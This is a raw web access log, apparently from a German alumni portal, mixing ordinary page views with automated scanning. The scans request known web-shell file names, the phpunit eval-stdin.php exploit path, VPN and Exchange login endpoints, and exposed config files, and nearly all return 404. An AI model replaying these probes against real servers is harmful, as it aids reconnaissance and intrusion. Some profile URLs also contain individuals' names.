a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:29;/;/.well-knownold/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:30;/;/.well-known/pkivalidation/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:31;/;/wp-content/plugins/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:33;/;/wp-content/uploads/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:34;/;/wp-content/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:34;/;/wp-includes/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:34;/;/wp-admin/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:35;/;/wp-content/themes/bala.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:35;/;/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:35;/;/wp-content/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:36;/;/wp-includes/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:36;/;/wp-admin/dropdown.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:37;/;/alfa-rex.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:37;/;/alfanew.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:37;/;/wp-content/plugins/Cache/Cache.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:38;/;/wp-admin/js/widgets/about.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:38;/;/wp-p.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:39;/;/wp-admin/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:39;/;/wp-includes/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:39;/;/wp-content/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:40;/;/wsoyanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:41;/;/yanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:42;/;/wp-admin/js/about.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:42;/;/wp-content/plugins/seoo/wsoyanz.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:43;/;/wp-content/plugins/seoo/wsoyanz1.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:43;/;/cache-compat.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:43;/;/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:44;/;/wp-admin/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:44;/;/wp-consar.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:44;/;/repeater.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:45;/;/admin-post.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:46;/;/wp-admin/maint/maint/ajax-actions.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:47;/;/wp-admin/css/index.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:47;/;/about.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:48;/;/about.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:49;/;/alfanew.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:49;/;/adminfuns.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:50;/;/ebs.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:50;/;/ws.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:50;/;/alfanew2.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:51;/;/alfa-rex2.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:51;/;/ioxi-rex4.php7;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:51;/;/wp-content/plugins/seoo/alfa-ioxi.php;GET;404
a8ad6ab33235f0b34ad50eb8e80217b1d07fa2091b0cd2dc60455f6ec2deb3a2;2025-11-22 20:44:52;/;/wp-content/plugins/classic-editor/wp-login.php;GET;404
8affb5828293a93baf748217ab3b9089421340aad9719809eb133c1e6c8df4c7;2025-11-22 20:47:11;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-22 20:47:53;/personen/alumni/schule/0351;/personen/alumni/schule/5505;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-22 20:49:18;/personen/all/4;/personen/alumni/details/cynthia-ott;GET;200
ef1e19336b3c630f271930d81beef41ef54c01340dd8e0be1b3f3f12e5958b39;2025-11-22 20:49:43;;/personen/alumni/schule/170720;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-22 20:50:39;/gruppen/hobby/malen-und-zeichnen;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 20:52:04;/personen/alumni/schule/0351;/personen/alumni/schule/0350;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 20:53:26;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/chor;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 20:53:28;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
9f82559546e1f5cca8473cf48b7eb012dc817dd7f6d4eefc408afdc310730066;2025-11-22 20:56:57;;/;GET;200
b0382b8469291d2d863e646274ae6c06755521818ce7691d3500a2956c99b9cf;2025-11-22 20:58:31;;/sitemap.xml;GET;200
b23a1568a9364bc4ef51efc8151d6feacf5d492b12cc612087326a03acd8dab2;2025-11-22 21:00:31;;/;GET;200
9d8ba8654ed7f246e10fd8c967c1036e3f16f5ea79024f6e7076c17d40c575b3;2025-11-22 21:00:54;;/personen;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-22 21:22:31;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-22 21:22:32;/;/;GET;200
3393adc78f026529b7ab0dd218cc1fefea8e827c1e65a9302d9ad2a9435c454d;2025-11-22 21:24:33;;/rechtliches/nutzungsbedingungen;GET;200
255b188ac3d7988d5b7b84f3d91d94374acdd210fc447dbab1f889695efd8395;2025-11-22 21:31:57;;/personen/alumni/schule/188001;GET;200
a8f2c145316b032bfdab21a0f208d2cc6fd3d6f7c4d15498fa00934df568504a;2025-11-22 21:32:19;;/tr/;GET;404
0cd0a52058a589045bebda2bc6529b67360def77934e407e63a3c01911dd79a3;2025-11-22 21:33:03;;/;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-22 21:34:15;/;/;GET;200
7a9312b0d6adf89c81cd068e32139ada047406a634abdac3b123aa07328af76c;2025-11-22 21:35:36;;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
4ad9234dae1ee8f5acf4b6c8921643b26bc354d10d3462593a03080ef3b8f899;2025-11-22 21:35:38;;/gruppen;GET;200
cfacb4e5e50604ac95984ffb0c6a0e71023c197992b5f31458698d035e245f71;2025-11-22 21:41:09;;/personen/alumni/schule/59013;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 21:44:13;/personen/all/4;/personen/alumni/details/jessica-schwarz;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 21:45:37;/gruppen/hobby/malen-und-zeichnen;/gruppen/hobby/film-und-videoproduktion;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-22 21:45:38;/gruppen/hobby/malen-und-zeichnen;/gruppen;GET;200
b3f0ad22bd92d456e8ac1abe456a7d0d319ad625b214904a198a955736cfb010;2025-11-22 21:47:31;;/themen/details/abschied-aus-moabit;GET;200
68e1a8e72ea995310d48d6211a66d52ef14e23ecd34573c332cce66a3740664f;2025-11-22 21:52:29;;/personen/alumni/schule/4440012;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-22 21:54:09;/;/;PROPFIND;405
f4fcc6ce97777e91146247ccaa71dd61ce5d4cf40442da9ca0442118e0545af0;2025-11-22 21:57:14;;/personen/alumni/schule/185826;GET;200
dff1cf1e7bb3d08663e8c4008e3147751c7d028349f8b1bd75301587eb32b1e8;2025-11-22 22:02:29;;/personen/alumni/details/sophia-gawron;GET;200
167efb2e94c46bd0de746df6cf874e1d0f072fde216df200330b728386c6083d;2025-11-22 22:03:28;;/;GET;200
489bee7c4fd529b5488512dc806b8414573e5286a7f017b6b9fda8e47162c8c9;2025-11-22 22:08:18;;/gruppen/hobby/abschlussfest;GET;302
489bee7c4fd529b5488512dc806b8414573e5286a7f017b6b9fda8e47162c8c9;2025-11-22 22:08:19;;/gruppen;GET;200
c94bf1b226179153f8fae0c01144ec7e1803adad51fcf578033306290a723543;2025-11-22 22:08:39;;/aktuelles/stellenangebote;GET;200
dff02c98e5082040ee55831bf19ae7ba14ec994fc75a9291b84bd742ae493388;2025-11-22 22:12:12;;/personen/alumni/schule/MP004;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-22 22:20:55;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
cb9061f7a2b151f7b9e6168b73bab0b4e95ffb18cde3f40e8f37f42fbc771a3b;2025-11-22 22:21:04;;/owa/auth/errorFE.aspx?httpCode=500;GET;404
cb9061f7a2b151f7b9e6168b73bab0b4e95ffb18cde3f40e8f37f42fbc771a3b;2025-11-22 22:21:04;;/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application;GET;404
cb9061f7a2b151f7b9e6168b73bab0b4e95ffb18cde3f40e8f37f42fbc771a3b;2025-11-22 22:21:04;;/owa/auth/logon.aspx;GET;404
7f55b180f504b486404cb18a79a77b01daf738eaf816885de04aee7e65902628;2025-11-22 22:21:41;;/personen/alumni/schule/68470;GET;200
92998ebf7ebac5b4902702ae6110cd1369c946ad63a92412364137423938ad6b;2025-11-22 22:22:33;;/;GET;200
2bed4ec7ba6bdd34a65b1b40e1ca02f77fa7ae30fdb5bd749fb0d54d9143f0b3;2025-11-22 22:25:33;;/version;GET;404
2bed4ec7ba6bdd34a65b1b40e1ca02f77fa7ae30fdb5bd749fb0d54d9143f0b3;2025-11-22 22:25:34;;/api/v1/pods;GET;404
055ebe429b40f02624df20bc2bd5220ffe06990e6eb2dc2a208ca8f161972335;2025-11-22 22:27:15;;/;GET;200
054525baf401783d6f91e1dc708404093fb2fb6adde26df8b824fa728ab37a67;2025-11-22 22:30:53;;/dana-na/nc/nc_gina_ver.txt;GET;404
054525baf401783d6f91e1dc708404093fb2fb6adde26df8b824fa728ab37a67;2025-11-22 22:30:54;;/dana-cached/hc/HostCheckerInstaller.osx;GET;404
2811fbae51e0fe40fea8f2d639a03332ac315f817d2a292df6011e0edcd62736;2025-11-22 22:32:13;;/personen/alumni/schule/170720;GET;200
5a47f6102b7fc3126ecc3421a02e8fc2e802d9e102a8ccbcaa53d82ad4a6fcd7;2025-11-22 22:32:22;;/RDWeb;GET;404
5a47f6102b7fc3126ecc3421a02e8fc2e802d9e102a8ccbcaa53d82ad4a6fcd7;2025-11-22 22:32:22;;/;GET;200
5a47f6102b7fc3126ecc3421a02e8fc2e802d9e102a8ccbcaa53d82ad4a6fcd7;2025-11-22 22:32:23;;/Remote;GET;404
5a47f6102b7fc3126ecc3421a02e8fc2e802d9e102a8ccbcaa53d82ad4a6fcd7;2025-11-22 22:32:23;;/RDWeb/Pages/en-US/login.aspx;GET;404
cee840647915358c89de14215b20423f626d8e5a7ee6ad79eccfc60732e34ba6;2025-11-22 22:40:03;;/;GET;200
cee840647915358c89de14215b20423f626d8e5a7ee6ad79eccfc60732e34ba6;2025-11-22 22:40:03;;/auth.html;GET;404
cee840647915358c89de14215b20423f626d8e5a7ee6ad79eccfc60732e34ba6;2025-11-22 22:40:03;;/auth1.html;GET;404
cee840647915358c89de14215b20423f626d8e5a7ee6ad79eccfc60732e34ba6;2025-11-22 22:40:04;;/sslvpnLogin.html;GET;404
cee840647915358c89de14215b20423f626d8e5a7ee6ad79eccfc60732e34ba6;2025-11-22 22:40:04;;/api/sonicos/auth;GET;404
cee840647915358c89de14215b20423f626d8e5a7ee6ad79eccfc60732e34ba6;2025-11-22 22:40:05;;/api/sonicos/tfa;GET;404
e887c35cb3a93bc576d119b8ab127ee19c49e6e47e6f8730ef9bae8947de817e;2025-11-22 22:42:34;;/personen/alumni/schule/59000;GET;200
b7ae5c87e8dd819bdf3bd4ae812d3040891842ed2e301e8dec5c480b652236ef;2025-11-22 22:43:32;;/;GET;200
6a9f73d6f2ba62734d95ff0df83fdf0290fc21ec9c63714af903728a73ebaed1;2025-11-22 22:44:08;/sitecore/shell/sitecore.version.xml;/sitecore/shell/sitecore.version.xml;GET;404
61fd9b534d70729ce3ee9f45cd67e1266619439999636edb363063d413660ce4;2025-11-22 22:47:44;;/;GET;200
b7ae5c87e8dd819bdf3bd4ae812d3040891842ed2e301e8dec5c480b652236ef;2025-11-22 22:48:42;;/;GET;200
a176c93321a22e717da79e6ee7c955ac600d523c1efe3cd85a88048318024df5;2025-11-22 22:58:19;;/themen/details/der-start-ins-studium;GET;200
a176c93321a22e717da79e6ee7c955ac600d523c1efe3cd85a88048318024df5;2025-11-22 22:59:56;;/themen/details/der-start-ins-studium;GET;200
a422fd29867c5aa4f3a2b33ff75cdc7c36989324ec36b5d6ab188354bf23de57;2025-11-22 23:01:48;;/rechtliches/nutzungsbedingungen;GET;200
da3b98fa1999aa860bccfbce0cc14539925687f3c6ffc4061a42c93d80c45431;2025-11-22 23:02:42;;/rechtliches/impressum;GET;200
08d4b0e107931736fc597a4d6e2ed60fed679dceebae55de54959629f96ccc3b;2025-11-22 23:03:56;;/;GET;200
3c8beb4e1ea6ba87f1c304f91a8238bfd7288d89eea5ffbd815e1b01dfd24ee0;2025-11-22 23:10:48;;/personen/alumni/schule/4540118;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-22 23:24:57;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
cf4f903f150bbcebf522258af065f2200b8794f43b8105d68c264dc1d6ed758a;2025-11-22 23:38:40;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-22 23:42:26;/personen/alumni/details/luca-onorini;/personen/alumni/schule/620014;GET;200
9370540c9ca1312bad46ff9ceaa69ba76e8fcf62e5ad9705c68242df8be6857f;2025-11-22 23:44:22;;/;GET;200
5b62468f6e45f446a26f8fadc0a84139db07e5d0da8be7a6e87a882cbf822423;2025-11-23 00:07:13;;/personen/alumni/schule/185826;GET;200
76e195031db9402f10b66e650e548a4a0316c8f9fb9d500b5c234339846d5c7c;2025-11-23 00:32:59;;/personen/alumni/schule/170720;GET;200
0c05ab84696ea6690ec6c53a8b840eac89c2fea48a00c17a8bd4f427e51c0873;2025-11-23 00:33:17;;/docs/img/login.svg;GET;404
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-23 00:45:42;/personen/alumni/details/luca-onorini;/personen/alumni/schule/68457;GET;200
2adb54f59cba46fd351a344d02f4730ca6cdb248eff94d3eb62b1c082c0ee3b8;2025-11-23 00:57:22;;/;GET;200
dc691caa830bd462f5544d5ac898b05075e695d82277fecd91a78d24224b6675;2025-11-23 00:59:31;;/rechtliches/nutzungsbedingungen;GET;200
eb8d8c64f831102a88a59bf74658d05dbde52e7aaa29d04d6622b29093a1069b;2025-11-23 01:02:06;;/media/cache/post_thumbnail/images/blogpost/pexels-pavel-danilyuk-7944238-1737842220.jpg;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:06;;/;GET;200
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:06;;//wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:06;;//xmlrpc.php?rsd;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:07;;/;GET;200
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:07;;//blog/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:07;;//web/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:08;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:08;;//website/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:09;;//wp/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:09;;//news/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:09;;//2018/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:10;;//2019/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:10;;//shop/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:10;;//wp1/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:10;;//test/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:11;;//media/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:11;;//wp2/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:11;;//site/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:12;;//cms/wp-includes/wlwmanifest.xml;GET;404
0b60a4065852b652632c2703c6c08b93e28ab386e7b92a22cf9991cd0dea1d52;2025-11-23 01:10:12;;//sito/wp-includes/wlwmanifest.xml;GET;404
096ac8b9a242528887b479bb891196e7458a3a4ad49c38f2367f16c3888a7143;2025-11-23 01:16:56;;/;GET;200
1d13994daf0dfcc0585e9400921c87455c438552f5d60b919d8b5522e4818396;2025-11-23 01:16:58;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
1b68755d5a5003df10c11c3d2ac0750c1e626837127e6351cf9e8accbda6abae;2025-11-23 01:20:19;;/;GET;200
e6d221d31465cc949ad169eb149205366894c5fe5abd01c88e968314bb1b83eb;2025-11-23 01:21:15;;/sitemap.xml;GET;200
6b79d45312536ad23d5408a8e1241a4ee5abb64c0dfc27783126b5ca28d20c48;2025-11-23 01:21:28;;/config.json;GET;404
1b68755d5a5003df10c11c3d2ac0750c1e626837127e6351cf9e8accbda6abae;2025-11-23 01:23:26;/;/;GET;200
eb22af8ae7ad8f2157f48a46f52c51b5f98c2485e64c384304bd85abd27ccf2b;2025-11-23 01:23:47;/sitemap.xml;/sitemap.xml;GET;200
dea12af6b99cd1dc44b752f40b76f2f5c98bdf78ceedfc2ebce483dde062ea1e;2025-11-23 01:25:49;;/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php;GET;404
8b981d1c93d549da64cee9785d36082e2125095dc6ea51e61f86b4145cbf4623;2025-11-23 01:26:20;;/themen/details/abschied-aus-moabit;GET;200
d5ff254eb3eaa8e70e45fe8c2c50382e6f39d130f8d628ee24fcf0ac78024e2c;2025-11-23 01:27:08;;/;GET;200
7bf4dcda95ef1fc8d97e4fd80ebb950248254371e4310cb58a8f572d9fd38a08;2025-11-23 01:45:03;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-23 01:45:18;;/assets/env.js;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-23 01:45:20;;/config/env.js;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-23 01:45:24;;/connexion.env;GET;404
46b339cbf07f2a5dad6e9969dfde8139666f1f96a479ab8eb1127397827d3b01;2025-11-23 01:53:01;;/aktuelles/stellenangebote;GET;200
bbdd67f67647ee1d7a290d3e988d352a45013556fbc309280fc757393da60b4b;2025-11-23 01:55:03;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
a82b64d90154f6ad3ce3d56b37b6c5e81ba1ea9a89dc1e9f9586a1f26cee9da4;2025-11-23 02:15:11;/;/;GET;200
4e26edad5fc5c454eba3e8e475bb01112c5a10f1ef968bb62256eb2133dc33e2;2025-11-23 02:15:53;;/aktuelles/meldungen?category=community;GET;200
991fc555599b1655263a4b24589738462d4ab06819ba0f736082baac96c66f65;2025-11-23 02:17:59;;/gruppen/hobby/finanzbildung;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-23 02:20:48;/gruppen/hobby/programmieren;/gruppen/hobby/grafikdesign;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-23 02:20:49;/gruppen/hobby/programmieren;/gruppen;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-23 02:22:12;/gruppen/interesse/selbststandigkeit;/personen/alumni/details/sophia-gawron;GET;200
8053768d98a4e7f8f16a0e3ee00c9e0efcb9370641c9d8505dddaf97c7a7cea8;2025-11-23 02:23:21;;/personen/alumni/schule/185826;GET;200
8710226a8e1aad35fe2fb671859ecd878de32503cebcdd5ad62d75b1be6006b0;2025-11-23 02:26:57;;/themen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
18845b9d2a64131dc2f4579b725afda3394f7bd4ed0ef0655f8d4d5ce94ac9ea;2025-11-23 02:27:11;/;/;GET;200
46a9dc5bd7e568c09623f442efecd8c19665d2919dc44ff03b3fa81d9037868c;2025-11-23 02:27:41;;/;GET;200
36b7b73e115bcf8095506612fbbfcf26d87042c20925e337ba72f36cd8dc079c;2025-11-23 02:35:12;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
b1df002bdba437aa204f115c5440d04263b1902ed553ed63f1d762e15fc2b23f;2025-11-23 02:41:28;;/personen;GET;200
9381a638ea42b11a4f35a59c063f3246cd79bc228a026a3b88a93402f9654231;2025-11-23 02:52:13;/;/;GET;200
8b09046135b840c4671d7f34b4e474274f8f8db9378033084b41416ea44dbc5a;2025-11-23 02:54:05;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
7830be44e3e47a84003ce558e93cb65d6a93f1d7fa761f3e1f6a2675607b8bc3;2025-11-23 02:56:38;;/rechtliches/impressum;GET;200
60a3b8a34de89a248b264a70196cc84d57bf76418a2ece95a1d05927134245d3;2025-11-23 02:58:57;;/;GET;200
fff78639dc4db5ae5a7b469a0e0f4f53425d67c4eeeb4473b78b3c2d419aff32;2025-11-23 03:11:24;;/;GET;200
43890574a9acee27bf83953c61466f70f76bbc011ceba8572fe341a5cf1bd207;2025-11-23 03:12:09;;/;GET;200
56a49fa60f9d0e9a4887ded69d6a327a243737c9c6e17f8816a653b999a98fed;2025-11-23 03:15:27;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
96a6f3527f2f38f9e9654cc5ed56e4793c230f6d2eb35d35a01c0827508b0ce0;2025-11-23 03:15:31;;/aktuelles/stellenangebote;GET;200
465639ca5ffd2ea9272ca6c37f265507045fb6faaa60a8bea8e0042768c95ae5;2025-11-23 03:17:43;;/;GET;200
0d2812da44ce7f0d540b65e50c2c61658901c23a5f54de97c4eea4f355579b87;2025-11-23 03:23:10;;/;GET;200
f24d1909caea35c97685618b89a62a5847bffca73091a5173f5c01f6efaee5f1;2025-11-23 03:25:24;;/;GET;200
75b412b7122924855b729509a8ff3dfe35d94cbc1423a01e8fc992f0367d221b;2025-11-23 03:26:57;;/themen?category=community;GET;200
d0be8bb7fd0be6aab6961e33f9c0abdac67db68697bff4dda37e33941f51e588;2025-11-23 03:31:51;;/aktuelles/stellenangebote;GET;200
33117a9926739072b3d035d4f549e90eecf084f8a8d1268955519f60348be883;2025-11-23 03:31:55;;/personen/alumni/schule/170720;GET;200
793a2a9c748c811673bc0043979ff287cc1dffc22734c9b00efa7091eebd96e0;2025-11-23 03:32:05;/;/;GET;200
3dc2a43ecf2dfc86c1cdf2811e836c2033832f5cfda08bdff57c1bb44eefcdc8;2025-11-23 03:39:55;;/personen;GET;200
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-23 03:43:58;;/personen/all/5;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-23 03:45:57;/themen?category=wissenschaft;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
facef30f11e4c3587bddc290a832e7d574a4a26be3250a3fd174be3045d5537d;2025-11-23 03:46:02;;/;GET;200
cd171f8700f541f2fe535e54b7f402f94963993a9786b216ffb6bad6a115d04b;2025-11-23 03:46:31;;/docs/img/ep02.png;GET;404
